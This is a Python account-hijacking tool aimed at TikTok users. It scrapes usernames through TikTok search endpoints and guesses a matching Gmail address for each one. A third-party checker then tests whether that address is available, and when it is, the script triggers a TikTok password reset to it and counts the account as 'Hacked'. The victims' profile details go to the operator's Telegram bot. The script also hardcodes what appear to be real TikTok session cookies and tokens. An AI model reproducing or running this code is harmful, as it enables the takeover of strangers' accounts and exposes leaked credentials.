import requests
import json
import random
import time
import os
a = 0
r =0
rr=0
j=0
rrr=0
aa=0
aaa=0
aaaa=0
p = 0
m =0
n = 0
s = 0
b = 0
id2  = ('121212ssss')
urlp = requests.get('https://pastebin.com/Lb2PH728').text
if id2 in urlp:
    os.system('cls'if os.name=='nt'else'clear')
else:
    def loginid():
        os.system('cls'if os.name=='nt'else'clear')
        urlpp = requests.get('https://pastebin.com/Lb2PH728').text
        ina = input('Cod Githup or MMVMVP : ')
        
        if ina in urlpp :
            print('DOne code ')
            os.system('cls'if os.name=='nt'else'clear')
            
        else:
            print('No Login....')
            os.system('cls'if os.name=='nt'else'clear')
            while True:
                loginid()
    loginid()



os.system('cls' if os.name=='nt'else'clear')
def gmail():
    took = input('Enter Your ToKEN  Bot : ')   
    idddd = input('Enter Your ID Accouint : ')


    
    global a,m,n,a,p,aaa,aaaa,aa,rr,rrr,r,j
    try:
        file = open('user.txt','r').read().splitlines()
    except FileNotFoundError as error:
        print('Error File')
        exit()
    for email in file:
        try:
            
            url0 = f'https://ffnzz.scriptfree.repl.co/api-Checker-Gmail/?email={email}'
            xb = requests.get(url0).text
        except requests.exceptions.SSLError as error:
            print('Error')
        
      
        if ('"status":"BAD"') in xb:
            p+=1
            os.system('cls' if os.name =='nt'else'clear')
            print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
        elif ('"status":"GOD"') in xb:
        
            url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
            headers = {
            'host':'api2-19-h2.musical.ly',
            'connection':'keep-alive',
            'cookie':'sstore-idc=maliva; store-country-code=iq; odin_tt=056f31c10f8c82638f6d4d64669ad49e9c36d4946d5d596f433d7f2d75fa1592a21c201d712196d54ee4ae4e14ac8708eee32dc97c85c0a65510024ecc0698346f73ecab038b7160dbff96ced716b8af',
            'accept-Encoding':'gzip',
                'user-agent':'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ; SM-A022F; Build/RP1A.200720.012; Cronet/58.0.2991.0)',
                'connection': 'close'}
            data = f"app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233"
            try:
                ree = requests.post(url,headers=headers,data=data).text
            except requests.exceptions.ConnectionError as error:
                continue
        
            if ('"Sent successfully"') in ree:
            
                
       
                a+=1
                os.system('cls' if os.name =='nt'else'clear')
                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
                us11 = email.split('@')[0]
                
                ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
                ik = requests.get(ui).text
                if ('اليوزر غير موجود') in ik:
                    p+=1
                else:
            
                    nam = ik.split('name :')[1]
                    name = nam.split('follower')[0]
                    fo = nam.split('follower :')[1]
                    fol = fo.split('following :')[0]
                    fols = ik.split('following :')[1]
                    fols1 = fols.split(' heart :')[0]
                    lik = ik.split('heart :')[1]
                    like = lik.split('bio :')[0]
                    bi = ik.split('bio :')[1]
                    bio = bi.split('id :')[0]
                    id1 = ik.split('id :')[1]
                    id = id1.split('posts : ')[0]
                    vieod= ik.split('posts :')[1]
              
                #re2 = requests.get(url2,headers=head2).json()
                    j+=1
                    req = f'HIT : {j}\nName : {name}\nEmail : {email}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
                    tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                    ru= requests.post(tlg)
                    try:
                        with open('true.txt','a') as f8:
                            f8.write(f'{req}\n')
                    except UnicodeEncodeError as error :
                        with open('true.txt','a') as f8:
                            f8.write(f'{req}\n')
                    
                
            elif ('"Bind device by email failed"') in ree:
                m+=1
                os.system('cls' if os.name =='nt'else'clear')
                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
def fol2():
    global a,p,m
    lm ='qwertyuioplkjhgfdsazxcvbnm_'
    while True:
        
    
        
        us=str(''.join(random.choice(lm)for i in range(3))).lower()
        #us = '1p3v'
        
        url1 =f'https://www.tiktok.com/api/search/general/preview/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.87&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=17&is_fullscreen=false&is_page_visible=true&keyword={us}&os=windows&priority_region=IQ&referer=https%3A%2F%2Fwww.tiktok.com%2F%401p3v%3Flang%3Den&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&verifyFp=verify_la21xld1_d7Th6Zbn_htTX_4WEU_9YgK_6cqIkqgITOIY&webcast_language=en'
        hread1 ={
            'accept': '*/*',
            
            'accept-language': 'en-US,en;q=0.9',
            
            'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; tt_csrf_token=TRFt9hla-AM0nK3ArNWcI8ElQye_OZkBCxHw; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQZDMTApB7jD+EAQAAA8g1RghUYc8QKIlxu9HsnnEKt/A9Im/EJIyshuj09Wh72WSlLOdMsS0vKqcEnDPI0nPOwMWxNB3dQ6Glb3pEIjMrHLC9fOw8rDu4h9am5nAp8y9KUOJ8boSuRh0R22nw2gg6dnIL7i+ekyQe3d4DYbTOKBCT0mz+gp90n2ojvtXslZCApGdWgjZIakRwp+k524nmRxNCP6KKtb6EYTQSQ4O8x6GbY8zLnhLFF4vyS1kuizkw95Wr3Sd/aOAhZD6SA+jtZMiSk+qLivEHHFXlqTmXXWoISJifQzcv5cZTHo3OGkGKHpoVHkEbZTrX4zw991E5NaifiRPOZOvNDjcj6Qgb8xwFSDPtKY62/4skOvIlrVtzTU/T9wTL+A==~-1~-1~-1; bm_sz=B876E6A1E48D95E0DC600E8C25EF33C3~YAAQZDMTApF7jD+EAQAAA8g1RhEmfiJ2TVVhXHaoUHlNbDQVqmsMkjbAQrD9YptTwRAN6Nwc8uiMH6UXgEtz48ssd2HH1vI0dndqXLljO+qZnSJW4RMwpXJYlQ2lwimGhNlex5WtwYCw9gGDVh3+x4MSSsEB38M+k1GrFbs37TAxgu5Foa55vO7AAEoY2oesKe4QRCoJ8W1T35VARBQs5u/lK3nwNVC/VWGFvaiUDMgIsMNBZVxxS4GeXve11vk7bVP2h5NYzV5SEOS6te58Y1imeWYhwkFY9GiZbn5fyHtvCUY=~3487031~3159861; s_v_web_id=verify_la3ni3fp_cBj8CzCv_oS66_4qEg_Bg9B_8u9ojG3PpadE; cmpl_token=AgQQAPOnF-RO0o2Fx4z5Ox0_-T7DfJfY_4csYMuC-w; sid_guard=f58913c59b94c0f53076c8deb7ab87e5%7C1667636144%7C5184000%7CWed%2C+04-Jan-2023+08%3A15%3A44+GMT; uid_tt=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; uid_tt_ss=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; sid_tt=f58913c59b94c0f53076c8deb7ab87e5; sessionid=f58913c59b94c0f53076c8deb7ab87e5; sessionid_ss=f58913c59b94c0f53076c8deb7ab87e5; sid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; ssid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=j4ZWVL3Yi34tUszZJaBk7skck1qXZy2I0gS5xPsc_meZG7S69Rzkyly3Dh6fXZaYKica8ddMfBJg4ex_-QUXziFRn5OTMYzfAcxvrfwkwhmveK5jwzQcGrEJIck7jKQi2i-v2jMtS93U_KM27bYzezTmws-FwfY74Vhm9B2yAL5xTabdt9ogRT4zTqg7XSJR9YcXOiu99mif3PomEatoPaoGEfrPfmP4sIKw-dggTyGAAVyxCksBmxLTNhqPPDoEsk832xtn0TQp3HdCw0pCyZQRUz8nPT6EL-bIBxbvBz5GBFlOvzuNo5UUH0muE_POKRhgUhzhJLheggJ0JJI7OV4Yor8zKrQrbHVrPksPsCZBC3j7vc64yPprTh1jNmJsVy0l6EWa7varGtpQ1k6FppG8JIQ1XxGr5_AIUbu7levtLC9jNmJfCH6KdviqCCjtgRzvXhHgo0jguXdnvnfmeLIoLGdItw9EU-xeI-ZHsbe0AX9WO3RNqdwJW9VgoE2u; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667636154%7C8d7708d63ef5c8964dba994c6f13b325250b65834e8578e6f4b2fa2d4cf1b99a; csrf_session_id=43080fca4516404ba63e6496231f261a; odin_tt=7318c85dc3fc11c7915a4389e36d3405e6141a185e793a51e6cf7f2830a512e148bc4fad6b065798134a652001b62ddb4e206399968bc2f0b0e894accb82b2e942dcf03cd3315c2801aa524b7097d244; msToken=SwrQ8oitPpetlig4U7GbQHfjMsqwU6KIumMDtt3-Gy7d5mqqCzr5w9R3YHlDIoR3sXTP4dS_W8csN0VEGX4Zo-k8QxdUJp3Sg3SAhU7pIkkOwq_Ex0Rat2sr7GdhWsa6VpcffwOSehGT5PCk8A==; msToken=uzn86nyCHFG2DKGJu6CaOoYlidWmI8SBjb9YRnadHfxXOOUUxn3ihBht7FNCbKvsQ9gt8MLxX47XANveT9LgigmlrYYWBHpzXpr1n2IIh83xyMEdMSAGCPd3PV83mo38rrDBHzBh1XFTKBvgsg==',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            
        }
        
        
            
        poo =requests.get(url1,headers=hread1).json()
        try:
            lkk = (len(poo['sug_list'][0]['word_record']['group_id']))
            
            lk = poo['sug_list'][1]['word_record']['group_id']
            #print(lk)
        
            url5 =f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.23&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=search&history_len=9&is_fullscreen=false&is_page_visible=true&keyword={us}&os=windows&priority_region=&referer=https%3A%2F%2Fwww.tiktok.com%2Flogout%3Flang%3Den%26redirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fsearch%253Flang%253Den%2526q%253D1p3v%2526t%253D{lk}&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&webcast_language=en&msToken=x1dAkwwykgxMWbc4OnPJ3vdMLCuG5OuOUaLjnDWFGuqXw3TjkfTh6A3J2nQI64HhU1GMRN6CbpEr5fDQMCiNzCWNNV6cDzK_8eL_e-MH1mD7O4ZTSbSGubLr5WhRjib15vG35U70NvkgXEx2&X-Bogus=DFSzswVL0vGANtdJS00ngz-w3U5X&_signature=_02B4Z6wo00001WkIQ5AAAIDBRDLWOFroPqVpCEcAADkpe9'
            hread11 ={
            'accept': '*/*',
            
            'accept-language': 'en-US,en;q=0.9',
            
            'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; tt_csrf_token=TRFt9hla-AM0nK3ArNWcI8ElQye_OZkBCxHw; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQZDMTApB7jD+EAQAAA8g1RghUYc8QKIlxu9HsnnEKt/A9Im/EJIyshuj09Wh72WSlLOdMsS0vKqcEnDPI0nPOwMWxNB3dQ6Glb3pEIjMrHLC9fOw8rDu4h9am5nAp8y9KUOJ8boSuRh0R22nw2gg6dnIL7i+ekyQe3d4DYbTOKBCT0mz+gp90n2ojvtXslZCApGdWgjZIakRwp+k524nmRxNCP6KKtb6EYTQSQ4O8x6GbY8zLnhLFF4vyS1kuizkw95Wr3Sd/aOAhZD6SA+jtZMiSk+qLivEHHFXlqTmXXWoISJifQzcv5cZTHo3OGkGKHpoVHkEbZTrX4zw991E5NaifiRPOZOvNDjcj6Qgb8xwFSDPtKY62/4skOvIlrVtzTU/T9wTL+A==~-1~-1~-1; bm_sz=B876E6A1E48D95E0DC600E8C25EF33C3~YAAQZDMTApF7jD+EAQAAA8g1RhEmfiJ2TVVhXHaoUHlNbDQVqmsMkjbAQrD9YptTwRAN6Nwc8uiMH6UXgEtz48ssd2HH1vI0dndqXLljO+qZnSJW4RMwpXJYlQ2lwimGhNlex5WtwYCw9gGDVh3+x4MSSsEB38M+k1GrFbs37TAxgu5Foa55vO7AAEoY2oesKe4QRCoJ8W1T35VARBQs5u/lK3nwNVC/VWGFvaiUDMgIsMNBZVxxS4GeXve11vk7bVP2h5NYzV5SEOS6te58Y1imeWYhwkFY9GiZbn5fyHtvCUY=~3487031~3159861; s_v_web_id=verify_la3ni3fp_cBj8CzCv_oS66_4qEg_Bg9B_8u9ojG3PpadE; cmpl_token=AgQQAPOnF-RO0o2Fx4z5Ox0_-T7DfJfY_4csYMuC-w; sid_guard=f58913c59b94c0f53076c8deb7ab87e5%7C1667636144%7C5184000%7CWed%2C+04-Jan-2023+08%3A15%3A44+GMT; uid_tt=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; uid_tt_ss=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; sid_tt=f58913c59b94c0f53076c8deb7ab87e5; sessionid=f58913c59b94c0f53076c8deb7ab87e5; sessionid_ss=f58913c59b94c0f53076c8deb7ab87e5; sid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; ssid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=j4ZWVL3Yi34tUszZJaBk7skck1qXZy2I0gS5xPsc_meZG7S69Rzkyly3Dh6fXZaYKica8ddMfBJg4ex_-QUXziFRn5OTMYzfAcxvrfwkwhmveK5jwzQcGrEJIck7jKQi2i-v2jMtS93U_KM27bYzezTmws-FwfY74Vhm9B2yAL5xTabdt9ogRT4zTqg7XSJR9YcXOiu99mif3PomEatoPaoGEfrPfmP4sIKw-dggTyGAAVyxCksBmxLTNhqPPDoEsk832xtn0TQp3HdCw0pCyZQRUz8nPT6EL-bIBxbvBz5GBFlOvzuNo5UUH0muE_POKRhgUhzhJLheggJ0JJI7OV4Yor8zKrQrbHVrPksPsCZBC3j7vc64yPprTh1jNmJsVy0l6EWa7varGtpQ1k6FppG8JIQ1XxGr5_AIUbu7levtLC9jNmJfCH6KdviqCCjtgRzvXhHgo0jguXdnvnfmeLIoLGdItw9EU-xeI-ZHsbe0AX9WO3RNqdwJW9VgoE2u; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667636154%7C8d7708d63ef5c8964dba994c6f13b325250b65834e8578e6f4b2fa2d4cf1b99a; csrf_session_id=43080fca4516404ba63e6496231f261a; odin_tt=7318c85dc3fc11c7915a4389e36d3405e6141a185e793a51e6cf7f2830a512e148bc4fad6b065798134a652001b62ddb4e206399968bc2f0b0e894accb82b2e942dcf03cd3315c2801aa524b7097d244; msToken=SwrQ8oitPpetlig4U7GbQHfjMsqwU6KIumMDtt3-Gy7d5mqqCzr5w9R3YHlDIoR3sXTP4dS_W8csN0VEGX4Zo-k8QxdUJp3Sg3SAhU7pIkkOwq_Ex0Rat2sr7GdhWsa6VpcffwOSehGT5PCk8A==; msToken=uzn86nyCHFG2DKGJu6CaOoYlidWmI8SBjb9YRnadHfxXOOUUxn3ihBht7FNCbKvsQ9gt8MLxX47XANveT9LgigmlrYYWBHpzXpr1n2IIh83xyMEdMSAGCPd3PV83mo38rrDBHzBh1XFTKBvgsg==',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            
        }
            re4 = requests.get(url5,headers=hread11).json()
            try:
                
                    
                usr = (len(re4['user_list'][0]['user_info']['unique_id']))
                for ii in range(1,usr):
                    
                    usr1 = re4['user_list'][ii]['user_info']['unique_id']
                    a+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'[=] - Done : {a}\n[=] - User : {usr1}\n[=] - Bad : {p}\n')
                    with open('user.txt','a') as fo:
                        fo.write(f'{usr1}@gmail.com\n')
            except IndexError as error:
                p+=1
        except KeyError as error:
            p+=1
            
            os.system('cls'if os.name=='nt'else'claer')
            print(f'[=] - Done : {a}\n[=] - Bad : {p}\n')
        except IndexError as error:
            p+=1
            os.system('cls'if os.name=='nt'else'claer')
            print(f'[=] - Done : {a}\n[=] - Bad : {p}\n')

            #exit()
        
        
        
        
    
    
    
    
def fol():
    global a,p,m
    lm ='qwertyuioplkjhgfdsazxcvbnm_'
    
    while True:
        us=str(''.join(random.choice(lm)for i in range(7))).lower()
       
        url1 =f'https://www.tiktok.com/api/search/general/preview/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.87&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=17&is_fullscreen=false&is_page_visible=true&keyword={us}&os=windows&priority_region=IQ&referer=https%3A%2F%2Fwww.tiktok.com%2F%401p3v%3Flang%3Den&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&verifyFp=verify_la21xld1_d7Th6Zbn_htTX_4WEU_9YgK_6cqIkqgITOIY&webcast_language=en'
        hread1 ={
            'accept': '*/*',
            
            'accept-language': 'en-US,en;q=0.9',
            
            'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; tt_csrf_token=TRFt9hla-AM0nK3ArNWcI8ElQye_OZkBCxHw; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQZDMTApB7jD+EAQAAA8g1RghUYc8QKIlxu9HsnnEKt/A9Im/EJIyshuj09Wh72WSlLOdMsS0vKqcEnDPI0nPOwMWxNB3dQ6Glb3pEIjMrHLC9fOw8rDu4h9am5nAp8y9KUOJ8boSuRh0R22nw2gg6dnIL7i+ekyQe3d4DYbTOKBCT0mz+gp90n2ojvtXslZCApGdWgjZIakRwp+k524nmRxNCP6KKtb6EYTQSQ4O8x6GbY8zLnhLFF4vyS1kuizkw95Wr3Sd/aOAhZD6SA+jtZMiSk+qLivEHHFXlqTmXXWoISJifQzcv5cZTHo3OGkGKHpoVHkEbZTrX4zw991E5NaifiRPOZOvNDjcj6Qgb8xwFSDPtKY62/4skOvIlrVtzTU/T9wTL+A==~-1~-1~-1; bm_sz=B876E6A1E48D95E0DC600E8C25EF33C3~YAAQZDMTApF7jD+EAQAAA8g1RhEmfiJ2TVVhXHaoUHlNbDQVqmsMkjbAQrD9YptTwRAN6Nwc8uiMH6UXgEtz48ssd2HH1vI0dndqXLljO+qZnSJW4RMwpXJYlQ2lwimGhNlex5WtwYCw9gGDVh3+x4MSSsEB38M+k1GrFbs37TAxgu5Foa55vO7AAEoY2oesKe4QRCoJ8W1T35VARBQs5u/lK3nwNVC/VWGFvaiUDMgIsMNBZVxxS4GeXve11vk7bVP2h5NYzV5SEOS6te58Y1imeWYhwkFY9GiZbn5fyHtvCUY=~3487031~3159861; s_v_web_id=verify_la3ni3fp_cBj8CzCv_oS66_4qEg_Bg9B_8u9ojG3PpadE; cmpl_token=AgQQAPOnF-RO0o2Fx4z5Ox0_-T7DfJfY_4csYMuC-w; sid_guard=f58913c59b94c0f53076c8deb7ab87e5%7C1667636144%7C5184000%7CWed%2C+04-Jan-2023+08%3A15%3A44+GMT; uid_tt=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; uid_tt_ss=c769a9fb7a501d20f0df053d7db061ce2b01f2cb6242f896f45b7ec2b19f00c0; sid_tt=f58913c59b94c0f53076c8deb7ab87e5; sessionid=f58913c59b94c0f53076c8deb7ab87e5; sessionid_ss=f58913c59b94c0f53076c8deb7ab87e5; sid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; ssid_ucp_v1=1.0.0-KDMyMzk4MTAyMzZkNjcyMDYxY2IzNmQxODY2NjZkMDlmY2QyNGRjZjEKIAiGiKeIt6XK3V0QsLeYmwYYswsgDDDr0uztBTgEQOoHEAMaBm1hbGl2YSIgZjU4OTEzYzU5Yjk0YzBmNTMwNzZjOGRlYjdhYjg3ZTU; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=j4ZWVL3Yi34tUszZJaBk7skck1qXZy2I0gS5xPsc_meZG7S69Rzkyly3Dh6fXZaYKica8ddMfBJg4ex_-QUXziFRn5OTMYzfAcxvrfwkwhmveK5jwzQcGrEJIck7jKQi2i-v2jMtS93U_KM27bYzezTmws-FwfY74Vhm9B2yAL5xTabdt9ogRT4zTqg7XSJR9YcXOiu99mif3PomEatoPaoGEfrPfmP4sIKw-dggTyGAAVyxCksBmxLTNhqPPDoEsk832xtn0TQp3HdCw0pCyZQRUz8nPT6EL-bIBxbvBz5GBFlOvzuNo5UUH0muE_POKRhgUhzhJLheggJ0JJI7OV4Yor8zKrQrbHVrPksPsCZBC3j7vc64yPprTh1jNmJsVy0l6EWa7varGtpQ1k6FppG8JIQ1XxGr5_AIUbu7levtLC9jNmJfCH6KdviqCCjtgRzvXhHgo0jguXdnvnfmeLIoLGdItw9EU-xeI-ZHsbe0AX9WO3RNqdwJW9VgoE2u; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667636154%7C8d7708d63ef5c8964dba994c6f13b325250b65834e8578e6f4b2fa2d4cf1b99a; csrf_session_id=43080fca4516404ba63e6496231f261a; odin_tt=7318c85dc3fc11c7915a4389e36d3405e6141a185e793a51e6cf7f2830a512e148bc4fad6b065798134a652001b62ddb4e206399968bc2f0b0e894accb82b2e942dcf03cd3315c2801aa524b7097d244; msToken=SwrQ8oitPpetlig4U7GbQHfjMsqwU6KIumMDtt3-Gy7d5mqqCzr5w9R3YHlDIoR3sXTP4dS_W8csN0VEGX4Zo-k8QxdUJp3Sg3SAhU7pIkkOwq_Ex0Rat2sr7GdhWsa6VpcffwOSehGT5PCk8A==; msToken=uzn86nyCHFG2DKGJu6CaOoYlidWmI8SBjb9YRnadHfxXOOUUxn3ihBht7FNCbKvsQ9gt8MLxX47XANveT9LgigmlrYYWBHpzXpr1n2IIh83xyMEdMSAGCPd3PV83mo38rrDBHzBh1XFTKBvgsg==',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            
        }
        
        try:
            poo =requests.get(url1,headers=hread1).json()
        except requests.exceptions.ConnectionError as error:
            continue
        try:
            lL = len(poo['sug_list'][0]['word_record']['words_content'])
            for i in range(0,lL):
                l00 = str(poo['sug_list'][i]['content'])
                #l0= str(poo['sug_list'][0])
                
                a+=1
            
                os.system('cls' if os.name == 'nt' else 'clear')
                
                print(f'[=] - User : {us}\n[=] - Done : {a}\n[=] - Bad : {p}\n')
                try:
                    with open('user.txt','a') as f8:
                        f8.write(f'{l00}@gmail.com\n')
                except UnicodeEncodeError as error:
                    p+=1
                    
